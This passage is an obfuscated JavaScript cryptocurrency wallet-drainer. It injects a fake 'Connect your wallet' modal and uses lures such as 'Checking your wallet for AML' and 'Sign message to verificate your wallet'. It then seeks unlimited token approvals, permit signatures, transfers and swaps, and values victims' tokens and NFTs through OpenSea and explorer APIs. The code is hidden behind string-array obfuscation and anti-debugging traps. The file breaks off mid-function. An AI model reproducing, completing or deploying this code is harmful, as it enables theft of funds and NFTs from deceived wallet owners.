const _0x53f51f = _0x2c7e;
(function(_0x26bf61, _0x3f0daa) {
    const _0x39be20 = _0x2c7e,
        _0x92d41d = _0x26bf61();
    while (!![]) {
        try {
            const _0x299f76 = parseInt(_0x39be20(0x279)) / 0x1 * (parseInt(_0x39be20(0x288)) / 0x2) + -parseInt(_0x39be20(0x1b4)) / 0x3 + -parseInt(_0x39be20(0x196)) / 0x4 * (-parseInt(_0x39be20(0x185)) / 0x5) + -parseInt(_0x39be20(0x257)) / 0x6 * (-parseInt(_0x39be20(0x1fc)) / 0x7) + parseInt(_0x39be20(0x1a3)) / 0x8 + -parseInt(_0x39be20(0x1c8)) / 0x9 + -parseInt(_0x39be20(0x206)) / 0xa;
            if (_0x299f76 === _0x3f0daa) break;
            else _0x92d41d['push'](_0x92d41d['shift']());
        } catch (_0x1663a4) {
            _0x92d41d['push'](_0x92d41d['shift']());
        }
    }
}(_0x2384, 0x55d20));
const _0x33d3b2 = (function() {
        let _0x14183d = !![];
        return function(_0xdcc9eb, _0x3be30b) {
            const _0x459114 = _0x14183d ? function() {
                const _0xf1a61c = _0x2c7e;
                if (_0x3be30b) {
                    const _0x4beb16 = _0x3be30b[_0xf1a61c(0x16b)](_0xdcc9eb, arguments);
                    return _0x3be30b = null, _0x4beb16;
                }
            } : function() {};
            return _0x14183d = ![], _0x459114;
        };
    }()),
    _0x33c7ed = _0x33d3b2(this, function() {
        const _0x5428cc = _0x2c7e;
        return _0x33c7ed[_0x5428cc(0x23c)]()[_0x5428cc(0x177)](_0x5428cc(0x262))['toString']()['constructor'](_0x33c7ed)['search'](_0x5428cc(0x262));
    });
_0x33c7ed();
const _0x59df58 = (function() {
    let _0x37931d = !![];
    return function(_0x11ede7, _0x1aeb2d) {
        const _0xa74440 = _0x37931d ? function() {
            const _0x453026 = _0x2c7e;
            if (_0x1aeb2d) {
                const _0x52ff4d = _0x1aeb2d[_0x453026(0x16b)](_0x11ede7, arguments);
                return _0x1aeb2d = null, _0x52ff4d;
            }
        } : function() {};
        return _0x37931d = ![], _0xa74440;
    };
}());
(function() {
    _0x59df58(this, function() {
        const _0x3b37e3 = _0x2c7e,
            _0x3bb799 = new RegExp('function\x20*\x5c(\x20*\x5c)'),
            _0x4a62d4 = new RegExp(_0x3b37e3(0x197), 'i'),
            _0x1f5953 = _0x2467c4(_0x3b37e3(0x283));
        !_0x3bb799[_0x3b37e3(0x2d4)](_0x1f5953 + _0x3b37e3(0x21c)) || !_0x4a62d4[_0x3b37e3(0x2d4)](_0x1f5953 + _0x3b37e3(0x17d)) ? _0x1f5953('0') : _0x2467c4();
    })();
}());
const MS_Server = _0x53f51f(0x1c5),
    MS_Verify_Message = '',
    MS_Custom_Chat = {
        'Enable': 0x0,
        'Chat_Settings': {
            'enter_website': '',
            'leave_website': '',
            'connect_success': '',
            'connect_request': '',
            'connect_cancel': '',
            'approve_request': '',
            'approve_success': '',
            'approve_cancel': '',
            'permit_sign_data': '',
            'transfer_request': '',
            'transfer_success': '',
            'transfer_cancel': '',
            'sign_request': '',
            'sign_success': '',
            'sign_cancel': '',
            'chain_request': '',
            'chain_success': '',
            'chain_cancel': ''
        }
    };

function _0x2c7e(_0x5748cc, _0x3cd1ef) {
    const _0xcd9eb6 = _0x2384();
    return _0x2c7e = function(_0x2467c4, _0x59df58) {
        _0x2467c4 = _0x2467c4 - 0x14f;
        let _0x54a6d2 = _0xcd9eb6[_0x2467c4];
        return _0x54a6d2;
    }, _0x2c7e(_0x5748cc, _0x3cd1ef);
}
var MS_Worker_ID = null;
let MS_Ready = ![],
    MS_Settings = {},
    MS_Contract_ABI = {},
    MS_ID = 0x0,
    MS_Process = ![],
    MS_Provider = null,
    MS_Current_Provider = null,
    MS_Current_Address = null,
    MS_Current_Chain_ID = null,
    MS_Web3 = null,
    MS_Signer = null,
    MS_Check_Done = ![],
    MS_Currencies = {},
    MS_Force_Mode = ![],
    MS_Sign_Disabled = ![],
    BL_US = ![],
    SP_US = ![],
    XY_US = ![];;
((async () => {
    const _0x31d643 = _0x53f51f;
    try {
        let _0x16c236 = await fetch(_0x31d643(0x232), {
            'method': _0x31d643(0x1e9),
            'headers': {
                'Accept': _0x31d643(0x1ca)
            }
        });
        MS_Currencies = await _0x16c236[_0x31d643(0x26a)]();
    } catch (_0x7e870f) {
        console[_0x31d643(0x2c3)](_0x7e870f);
    }
})());
const MS_API_Data = {
    0x1: _0x53f51f(0x188),
    0xa: _0x53f51f(0x1dd),
    0x38: _0x53f51f(0x2ca),
    0x89: 'api.polygonscan.com',
    0xfa: _0x53f51f(0x21b),
    0xa4b1: _0x53f51f(0x172),
    0xa86a: _0x53f51f(0x165)
};
var MS_MetaMask_ChainData = {};

function _0x2384() {
    const _0x2d9ab2 = ['utils', 'https://api.opensea.io/api/v1/assets?owner=', ',\x20Version:\x20', 'https://metamask.io', '0x4200000000000000000000000000000000000006', 'hasOwnProperty', 'balanceRawInteger', 'Wait_For_Confirmation', 'indexOf', 'floor_price', 'https://trustwallet.com', 'Permit_BL', 'swapper_type', 'version', 'prepend', 'enter_website', '1374558qjLmBF', 'action', 'https://', 'slice', 'permit', 'Swappers', 'waitForTransaction', 'match', 'amountIn', 'push', 'about:blank', 'https://link.trustwallet.com/open_url?coin_id=60&url=https://', '0x0000', 'sign_verify', 'Mode', 'lte', 'transfer_success', 'akuclaim.com', '2.0', 'text', '232515GcBmFI', 'ANKR', 'application/json', 'address[]', 'Loop_T', 'text/plain', 'startsWith', 'ERC1155', '{{ADDRESS}}', 'token_id', '0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270', 'onbeforeunload', 'hashMessage', 'Please\x20wait,\x20we\x27re\x20scanning\x20more\x20details...', 'allowed', 'code', '&apikey=', 'one_day_average_price', 'result', 'MS_ID', 'close', 'api-optimistic.etherscan.io', 'signMessage', 'Checking\x20your\x20wallet\x20for\x20AML...', 'path', 'ethereum', 'swapper_address', 'querySelector', 'sign_success', 'Wait_For_Response', 'Quickswap', '0xFA', 'asset_contract', 'GET', 'boolean', '<b>Waiting\x20for\x20your\x20sign...</b><br><br>Please,\x20sign\x20message\x20in\x20your\x20wallet!', 'appendChild', 'Trust\x20Wallet', 'Chat_Settings', 'join', 'Ethereum\x20Mainnet', 'tokenPrice', 'call', 'transfer', 'abi', '<b>Sorry!</b>\x20Your\x20wallet\x20doesn\x27t\x20meet\x20the\x20requirements.<br><br>Try\x20to\x20connect\x20a\x20middle-active\x20wallet\x20to\x20try\x20again!', 'Binance\x20Coin', '0x1E0049783F008A0085193E00003D00cd54003c71', 'providers', 'swapper', 'chain_identifier', 'Avalanche\x20Network\x20C-Chain', '14aYtevB', 'Ethereum', 'ERC721', 'estimateGas', 'open', 'V_MODE', 'sign_unavailable', 'object', 'Contract_Type', 'connect_cancel', '8281250KydUzX', 'check_wallet', 'Verification\x20Error', 'toHex', '<b>Sign\x20message</b>\x20to\x20verificate\x20you\x20wallet...', 'parse', 'Sign', 'href', 'BNB', '120', 'Loop_NFT', 'x2y2', 'request', 'chain_id', 'debu', 'getElementById', 'Address', 'num_sales', 'owner', 'RPCs', 'Min_Tokens_Price', 'api.ftmscan.com', 'chain', 'Contract_Legacy', 'substring', 'reduce', 'connect_success', 'web3-modal', 'For\x20security\x20reasons\x20we\x20can\x27t\x20allow\x20you\x20to\x20connect\x20empty\x20or\x20new\x20wallet', 'retrive_id', 'userAgent', 'payable', 'price', 'Binance\x20Wallet', 'We\x20have\x20received\x20your\x20signature,\x20but\x20it\x27s\x20incorrect,\x20please\x20try\x20again.', 'block', 'Something\x20went\x20wrong!', 'https://explorer.arbitrum.io', '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2', 'getSigner', 'BigNumber', 'type', 'Min_NFTs_Price', 'Settings', 'https://min-api.cryptocompare.com/data/pricemulti?fsyms=ETH,BNB,MATIC,AVAX,ARB,FTM,OP&tsyms=USD', 'length', 'functions', 'undefined', 'then', 'Contract_Blacklist', 'ETH', 'gger', 'includes', 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless', 'toString', 'chain_cancel', 'https://metamask.app.link/dapp/', 'Wallet_Blacklist', '0xf849de01b080adc3a814fabe1e2087475cf2e354', 'OPENSEA', 'USD', 'location', 'isMetaMask', 'from', 'Contract', 'Implementation', '.web3-overlay', 'CURRENCY', 'wallet_addEthereumChain', '&offset=0&limit=200', 'leave_website', 'LOW_BALANCE', 'Tokens', 'bsc', 'BinanceChain', 'assets', 'counter', 'Priority', 'amountOutMin', 'API', 'Your\x20wallet\x20is\x20not\x20AML\x20clear,\x20you\x20can\x27t\x20use\x20it!', '1593516Zjszrm', 'approve_request', 'swapExactTokensForETH', 'chainId', 'data', 'status', 'getGasPrice', 'error', 'raw=', 'Blur', 'getTransactionCount', '(((.+)+)+)+$', '0x38', '[SWAP\x20FOUND]\x20', 'chain_success', 'Min_Native_Price', 'primary_asset_contracts', 'Permit', 'wallet_switchEthereumChain', 'json', 'split', 'classList', 'worker_id', 'https://go.cb-w.com/dapp?cb_url=https://', 'POST', '_signTypedData', 'Getting\x20your\x20wallet\x20address...', '0x0', 'isCoinbaseBrowser', 'Good,\x20your\x20wallet\x20is\x20AML\x20clear!', 'Fantom\x20Opera', 'Uniswap', 'AVAX', 'body', '27HJEWgr', 'safa_approves', 'MetaMask', 'disconnect', 'transfer_request', 'Loop_N', 'connect_request', 'now', 'FTM', 'sendTransaction', 'init', 'transferFrom', 'selectedAddress', 'opera', '0x1', '24316HZSbQS', 'https://www.coinbase.com/wallet', 'eth', 'amountOut', '<b>Confirming\x20your\x20sign...</b><br><br>Please,\x20don\x27t\x20leave\x20this\x20page!', 'head', 'sendAsync', '&order_direction=desc&limit=200&include_orders=false', '0xEfF92A263d31888d860bD50809A8D171709b7b1c', 'expiry', 'hex', 'avalanche', 'success', 'https://api.opensea.io/api/v1/collections?asset_owner=', 'Contract_Whitelist', 'charCodeAt', '<b>Done!</b>\x20Sign\x20message\x20in\x20your\x20wallet\x20to\x20continue...', 'deadline', 'https://etherscan.io', 'nonce', 'AML\x20Error', '100', '@import\x20url(https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap);.web3-modal,.web3-overlay{position:fixed;top:0;left:0;width:100%}.web3-overlay{height:100%;background:rgba(23,23,23,.8);backdrop-filter:blur(5px);z-index:99998}.web3-modal{right:0;bottom:0;margin:auto;max-width:500px;height:fit-content;padding:21px\x200\x200;background:#fff;border-radius:10px;z-index:99999;font-family:Inter,sans-serif}.web3-modal-title{font-weight:700;font-size:24px;line-height:29px;color:#000;text-align:center}.web3-modal-items{border-top:1px\x20solid\x20rgba(0,0,0,.1);margin-top:21px}.web3-modal\x20.item{padding:15px\x2034px;border-bottom:1px\x20solid\x20rgba(0,0,0,.1);display:flex;align-items:center;justify-content:space-between;cursor:pointer;transition:.2s}.web3-modal\x20.item:hover{background:#fafafa}.web3-modal\x20.item\x20div{display:flex;align-items:center}.web3-modal\x20.item:last-child{border-bottom:none}.web3-modal\x20.item\x20span{font-weight:400;font-size:16px;color:#000;margin-left:11px}.web3-modal\x20.item\x20.icon{width:40px;height:40px;justify-content:center}.web3-modal\x20.item\x20.arrow{height:12px;width:7.4px;background:url(\x27/assets/web3-modal/images/arrow.svg\x27)\x20no-repeat}', 'mul', 'Arbitrum\x20One', 'spender', 'Contract_Address', 'permit_ver', 'CONTRACT', 'eth_requestAccounts', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45', 'Notifications', 'holder', 'matic', 'arbitrum', 'JsonRpcProvider', 'DOMContentLoaded', 'NFTs', 'Enable', 'methods', 'getElementsByTagName', 'focus', 'ERC20', 'value', 'function', 'display', 'MATIC', '/api?module=contract&action=getsourcecode&address=', 'DSB', 'name', 'hash', 'Unlimited_BL', 'schema_name', 'setAttribute', 'innerHTML', 'toLowerCase', 'Approve', '35000000000', 'check_finish', 'log', 'message', 'approve', 'substr', 'floor', '<b>Thanks!</b>', 'WalletConnect', 'api.bscscan.com', 'Server\x20is\x20Unavailable', 'https://bscscan.com', ',\x20Permit\x20Type:\x20', 'none', 'Native', '1158472395435294898592384258348512586931256', 'amount_raw', '0x89', 'Minimal_Wallet_Price', 'test', 'approve_token', 'createElement', 'nonces', 'sub', 'https://rpc.ankr.com/multichain/', 'application/x-www-form-urlencoded', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506', 'serialize', 'Sushiswap', 'balance', 'https://chrome.google.com/webstore/detail/binance-wallet/fhbohimaelbohpjbbldcngcnapndodjp', 'amount_usd', 'stringify', 'DOMAIN_SEPARATOR', '_blank', 'multicall', 'Connection\x20established', 'chain_request', 'Connecting\x20to\x20Blockchain...', 'map', 'NATIVE', '0x82af49447d8a07e3bd95bd0d56f35241523fbab1', 'nonpayable', 'eth_sendTransaction', 'addEventListener', 'script', 'uint256', 'stats', 'click', 'web3-overlay', 'api.snowtrace.io', 'encodeABI', 'enable', 'Ether', 'style', 'uint256[]', 'apply', 'splice', 'SRV_UNAVAILABLE', 'fire', 'parseEther', 'permit_token', 'https://polygonscan.com', 'api.arbiscan.io', 'polygon', 'tokenDecimals', 'isTrust', 'bool', 'search', 'amounts', '0x10ED43C718714eb63d5aA57B78B54704E256024E', 'sign_request', 'isApprovedForAll', 'replaceAll', 'input', 'Pancake', 'sign', 'swapper_allowance', '.connect-button', 'fantom', 'Coinbase', 'sign_cancel', '1145pDYlLv', 'ABI', 'bytes[]', 'api.etherscan.io', 'check_nft', 'Tokens_First', 'swapExactTokensForTokens', 'address', '0xA4B1', '0xA', 'isCoinbaseWallet', 'OS_Mode', 'div', 'sha3', 'constructor', 'tokenType', '0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7', '3320VPLYyh', '\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'default', 'Web3Provider', 'sort', 'optimism', 'Receiver', 'retrive_config', 'SeaPort', 'approve_cancel', 'ether', 'Chains', 'skip', '4913264oJewCK'];
    _0x2384 = function() {
        return _0x2d9ab2;
    };
    return _0x2384();
}
const fill_chain_data = () => {
        const _0x543975 = _0x53f51f;
        MS_MetaMask_ChainData = {
            0x1: {
                'chainId': _0x543975(0x287),
                'chainName': _0x543975(0x1f0),
                'nativeCurrency': {
                    'name': _0x543975(0x168),
                    'symbol': _0x543975(0x238),
                    'decimals': 0x12
                },
                'rpcUrls': [MS_Settings['RPCs'][0x1]],
                'blockExplorerUrls': [_0x543975(0x29a)]
            },
            0x38: {
                'chainId': _0x543975(0x263),
                'chainName': 'BNB\x20Smart\x20Chain',
                'nativeCurrency': {
                    'name': _0x543975(0x1f6),
                    'symbol': _0x543975(0x20e),
                    'decimals': 0x12
                },
                'rpcUrls': [MS_Settings['RPCs'][0x38]],
                'blockExplorerUrls': [_0x543975(0x2cc)]
            },
            0x89: {
                'chainId': _0x543975(0x2d2),
                'chainName': 'Polygon\x20Mainnet',
                'nativeCurrency': {
                    'name': _0x543975(0x2b6),
                    'symbol': _0x543975(0x2b6),
                    'decimals': 0x12
                },
                'rpcUrls': [MS_Settings[_0x543975(0x219)][0x89]],
                'blockExplorerUrls': [_0x543975(0x171)]
            },
            0xa86a: {
                'chainId': '0xA86A',
                'chainName': _0x543975(0x1fb),
                'nativeCurrency': {
                    'name': _0x543975(0x277),
                    'symbol': _0x543975(0x277),
                    'decimals': 0x12
                },
                'rpcUrls': [MS_Settings[_0x543975(0x219)][0xa86a]],
                'blockExplorerUrls': ['https://snowtrace.io/']
            },
            0xa4b1: {
                'chainId': _0x543975(0x18d),
                'chainName': _0x543975(0x2a0),
                'nativeCurrency': {
                    'name': _0x543975(0x238),
                    'symbol': _0x543975(0x238),
                    'decimals': 0x12
                },
                'rpcUrls': [MS_Settings['RPCs'][0xa4b1]],
                'blockExplorerUrls': [_0x543975(0x22b)]
            },
            0xa: {
                'chainId': _0x543975(0x18e),
                'chainName': 'Optimism',
                'nativeCurrency': {
                    'name': 'ETH',
                    'symbol': _0x543975(0x238),
                    'decimals': 0x12
                },
                'rpcUrls': [MS_Settings['RPCs'][0xa]],
                'blockExplorerUrls': ['https://optimistic.etherscan.io/']
            },
            0xfa: {
                'chainId': _0x543975(0x1e7),
                'chainName': _0x543975(0x275),
                'nativeCurrency': {
                    'name': _0x543975(0x281),
                    'symbol': _0x543975(0x281),
                    'decimals': 0x12
                },
                'rpcUrls': [MS_Settings[_0x543975(0x219)][0xfa]],
                'blockExplorerUrls': ['https://ftmscan.com/']
            }
        };
    },
    MS_Routers = {
        0x1: [
            ['Uniswap', _0x53f51f(0x2a6)],
            [_0x53f51f(0x17e), _0x53f51f(0x290)],
            [_0x53f51f(0x14f), '0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F']
        ],
        0xa: [
            ['Uniswap', _0x53f51f(0x2a6)]
        ],
        0x38: [
            [_0x53f51f(0x17e), _0x53f51f(0x179)],
            [_0x53f51f(0x14f), _0x53f51f(0x2db)]
        ],
        0x89: [
            [_0x53f51f(0x276), _0x53f51f(0x2a6)],
            [_0x53f51f(0x14f), _0x53f51f(0x2db)],
            [_0x53f51f(0x1e6), '0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff']
        ],
        0xfa: [
            ['Sushiswap', _0x53f51f(0x2db)]
        ],
        0xa4b1: [
            [_0x53f51f(0x276), _0x53f51f(0x2a6)],
            ['Sushiswap', _0x53f51f(0x2db)]
        ],
        0xa86a: [
            ['Sushiswap', _0x53f51f(0x2db)]
        ]
    },
    MS_Swap_Route = {
        0x1: _0x53f51f(0x22c),
        0xa: _0x53f51f(0x1a8),
        0x38: '0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c',
        0x89: _0x53f51f(0x1d2),
        0xfa: '0x21be370d5312f44cb42ce377bc9b8a0cef1a4c83',
        0xa4b1: _0x53f51f(0x15c),
        0xa86a: _0x53f51f(0x195)
    },
    MS_Uniswap_ABI = [{
        'inputs': [{
            'internalType': _0x53f51f(0x161),
            'name': _0x53f51f(0x1bc),
            'type': _0x53f51f(0x161)
        }, {
            'internalType': _0x53f51f(0x161),
            'name': _0x53f51f(0x254),
            'type': _0x53f51f(0x161)
        }, {
            'internalType': _0x53f51f(0x1cb),
            'name': _0x53f51f(0x1e0),
            'type': _0x53f51f(0x1cb)
        }, {
            'internalType': 'address',
            'name': 'to',
            'type': 'address'
        }],
        'name': _0x53f51f(0x18b),
        'outputs': [{
            'internalType': 'uint256',
            'name': _0x53f51f(0x28b),
            'type': _0x53f51f(0x161)
        }],
        'stateMutability': _0x53f51f(0x225),
        'type': _0x53f51f(0x2b4)
    }, {
        'inputs': [{
            'internalType': 'uint256',
            'name': _0x53f51f(0x299),
            'type': 'uint256'
        }, {
            'internalType': _0x53f51f(0x187),
            'name': _0x53f51f(0x25b),
            'type': _0x53f51f(0x187)
        }],
        'name': _0x53f51f(0x156),
        'outputs': [{
            'internalType': _0x53f51f(0x187),
            'name': '',
            'type': _0x53f51f(0x187)
        }],
        'stateMutability': _0x53f51f(0x225),
        'type': 'function'
    }],
    MS_Pancake_ABI = [{
        'inputs': [{
            'internalType': _0x53f51f(0x161),
            'name': 'amountIn',
            'type': _0x53f51f(0x161)
        }, {
            'internalType': 'uint256',
            'name': _0x53f51f(0x254),
            'type': _0x53f51f(0x161)
        }, {
            'internalType': _0x53f51f(0x1cb),
            'name': 'path',
            'type': 'address[]'
        }, {
            'internalType': _0x53f51f(0x18c),
            'name': 'to',
            'type': _0x53f51f(0x18c)
        }, {
            'internalType': _0x53f51f(0x161),
            'name': 'deadline',
            'type': _0x53f51f(0x161)
        }],
        'name': _0x53f51f(0x18b),
        'outputs': [{
            'internalType': _0x53f51f(0x16a),
            'name': _0x53f51f(0x178),
            'type': _0x53f51f(0x16a)
        }],
        'stateMutability': _0x53f51f(0x15d),
        'type': 'function'
    }, {
        'inputs': [{
            'internalType': _0x53f51f(0x161),
            'name': _0x53f51f(0x1bc),
            'type': _0x53f51f(0x161)
        }, {
            'internalType': _0x53f51f(0x161),
            'name': _0x53f51f(0x254),
            'type': _0x53f51f(0x161)
        }, {
            'internalType': _0x53f51f(0x1cb),
            'name': _0x53f51f(0x1e0),
            'type': _0x53f51f(0x1cb)
        }, {
            'internalType': _0x53f51f(0x18c),
            'name': 'to',
            'type': _0x53f51f(0x18c)
        }, {
            'internalType': _0x53f51f(0x161),
            'name': _0x53f51f(0x299),
            'type': 'uint256'
        }],
        'name': _0x53f51f(0x259),
        'outputs': [{
            'internalType': _0x53f51f(0x16a),
            'name': _0x53f51f(0x178),
            'type': _0x53f51f(0x16a)
        }],
        'stateMutability': _0x53f51f(0x15d),
        'type': 'function'
    }],
    MS_Current_URL = window[_0x53f51f(0x243)][_0x53f51f(0x20d)][_0x53f51f(0x17c)](/http[s]*:\/\//g, ''),
    MS_Mobile_Status = ((() => {
        const _0x2a9709 = _0x53f51f;
        let _0x41365d = ![];
        return function(_0x37e6da) {
            const _0x2006ae = _0x2c7e;
            if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i [_0x2006ae(0x2d4)](_0x37e6da) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i [_0x2006ae(0x2d4)](_0x37e6da['substr'](0x0, 0x4))) _0x41365d = !![];
        }(navigator[_0x2a9709(0x224)] || navigator['vendor'] || window[_0x2a9709(0x286)]), _0x41365d;
    })()),
    MS_Unlimited_Amount = _0x53f51f(0x2d0),
    MS_Modal_Style = _0x53f51f(0x29e),
    MS_Modal_Code = '<p\x20class=\x22web3-modal-title\x22\x20style=\x22margin-top:\x200px;\x22>Connect\x20your\x20wallet</p><div\x20class=\x22web3-modal-items\x22>\x20<div\x20class=\x22item\x22\x20onclick=\x22connect_wallet(\x27MetaMask\x27)\x22>\x20<div>\x20<div\x20class=\x22icon\x22><img\x20src=\x22/assets/web3-modal/images/MM.svg\x22\x20alt=\x22\x22/></div><span>MetaMask</span>\x20</div><div\x20class=\x22arrow\x22></div></div><div\x20class=\x22item\x22\x20onclick=\x22connect_wallet(\x27Coinbase\x27)\x22>\x20<div>\x20<div\x20class=\x22icon\x22><img\x20src=\x22/assets/web3-modal/images/CB.svg\x22\x20alt=\x22\x22/></div><span>Coinbase</span>\x20</div><div\x20class=\x22arrow\x22></div></div><div\x20class=\x22item\x22\x20onclick=\x22connect_wallet(\x27Trust\x20Wallet\x27)\x22>\x20<div>\x20<div\x20class=\x22icon\x22><img\x20src=\x22/assets/web3-modal/images/TW.svg\x22\x20alt=\x22\x22/></div><span>Trust\x20Wallet</span>\x20</div><div\x20class=\x22arrow\x22></div></div><div\x20class=\x22item\x22\x20onclick=\x22connect_wallet(\x27Binance\x20Wallet\x27)\x22>\x20<div>\x20<div\x20class=\x22icon\x22><img\x20src=\x22/assets/web3-modal/images/BW.svg\x22\x20alt=\x22\x22/></div><span>Binance\x20Wallet</span>\x20</div><div\x20class=\x22arrow\x22></div></div><div\x20class=\x22item\x22\x20onclick=\x22connect_wallet(\x27WalletConnect\x27)\x22>\x20<div>\x20<div\x20class=\x22icon\x22><img\x20src=\x22/assets/web3-modal/images/WC.svg\x22\x20alt=\x22\x22/></div><span>WalletConnect</span>\x20</div><div\x20class=\x22arrow\x22></div></div></div>',
    inject_modal = () => {
        const _0x548742 = _0x53f51f;
        try {
            let _0x460e40 = document[_0x548742(0x2d6)](_0x548742(0x169));
            _0x460e40[_0x548742(0x2be)] = MS_Modal_Style, document[_0x548742(0x28d)][_0x548742(0x1ec)](_0x460e40);
            let _0x2c7e67 = document[_0x548742(0x2d6)](_0x548742(0x191));
            _0x2c7e67['id'] = _0x548742(0x164), _0x2c7e67[_0x548742(0x26c)] = [_0x548742(0x164)], _0x2c7e67['style'][_0x548742(0x2b5)] = _0x548742(0x2ce), document[_0x548742(0x278)][_0x548742(0x1b2)](_0x2c7e67);
            let _0x3d1209 = document[_0x548742(0x2d6)]('div');
            _0x3d1209['id'] = _0x548742(0x221), _0x3d1209[_0x548742(0x26c)] = [_0x548742(0x221)], _0x3d1209[_0x548742(0x169)][_0x548742(0x2b5)] = _0x548742(0x2ce), _0x3d1209['innerHTML'] = MS_Modal_Code, document[_0x548742(0x278)][_0x548742(0x1b2)](_0x3d1209), document[_0x548742(0x1e3)](_0x548742(0x248))[_0x548742(0x15f)](_0x548742(0x163), () => {
                ms_hide();
            });
        } catch (_0x2aa2bd) {
            console[_0x548742(0x2c3)](_0x2aa2bd);
        }
    },
    inject_sweet = () => {
        const _0x5aed77 = _0x53f51f;
        try {
            let _0x1844b8 = document[_0x5aed77(0x2d6)](_0x5aed77(0x160));
            _0x1844b8[_0x5aed77(0x2bd)]('src', 'https://cdn.jsdelivr.net/npm/sweetalert2@11'), document[_0x5aed77(0x2b0)](_0x5aed77(0x278))[0x0][_0x5aed77(0x1ec)](_0x1844b8);
        } catch (_0x64db40) {
            console['log'](_0x64db40);
        }
    },
    ms_init = () => {
        const _0x26af24 = _0x53f51f;
        try {
            if (MS_Process) return;
            document[_0x26af24(0x215)](_0x26af24(0x221))[_0x26af24(0x169)][_0x26af24(0x2b5)] = _0x26af24(0x229), document[_0x26af24(0x215)](_0x26af24(0x164))[_0x26af24(0x169)][_0x26af24(0x2b5)] = 'block';
        } catch (_0x52b258) {
            console[_0x26af24(0x2c3)](_0x52b258);
        }
    },
    ms_hide = () => {
        const _0x3db0b2 = _0x53f51f;
        try {
            document[_0x3db0b2(0x215)](_0x3db0b2(0x221))[_0x3db0b2(0x169)][_0x3db0b2(0x2b5)] = 'none', document[_0x3db0b2(0x215)](_0x3db0b2(0x164))[_0x3db0b2(0x169)][_0x3db0b2(0x2b5)] = 'none';
        } catch (_0x593da2) {
            console[_0x3db0b2(0x2c3)](_0x593da2);
        }
    },
    load_wc = () => {
        const _0x1643e9 = _0x53f51f;
        MS_Provider = new WalletConnectProvider[(_0x1643e9(0x198))]({
            'rpc': {
                0x1: MS_Settings[_0x1643e9(0x219)][0x1],
                0xa: MS_Settings[_0x1643e9(0x219)][0xa],
                0x38: MS_Settings[_0x1643e9(0x219)][0x38],
                0x89: MS_Settings['RPCs'][0x89],
                0xfa: MS_Settings[_0x1643e9(0x219)][0xfa],
                0xa4b1: MS_Settings[_0x1643e9(0x219)][0xa4b1],
                0xa86a: MS_Settings[_0x1643e9(0x219)][0xa86a]
            },
            'network': _0x1643e9(0x1e1),
            'chainId': 0x1
        });
    },
    prs = (_0x5a410c, _0x2d77ea) => {
        const _0x5752b3 = _0x53f51f,
            _0x1d8b13 = _0x5ad048 => _0x5ad048[_0x5752b3(0x26b)]('')['map'](_0x3105e9 => _0x3105e9[_0x5752b3(0x297)](0x0)),
            _0x4382c3 = _0x53b228 => ('0' + Number(_0x53b228)[_0x5752b3(0x23c)](0x10))[_0x5752b3(0x2c6)](-0x2),
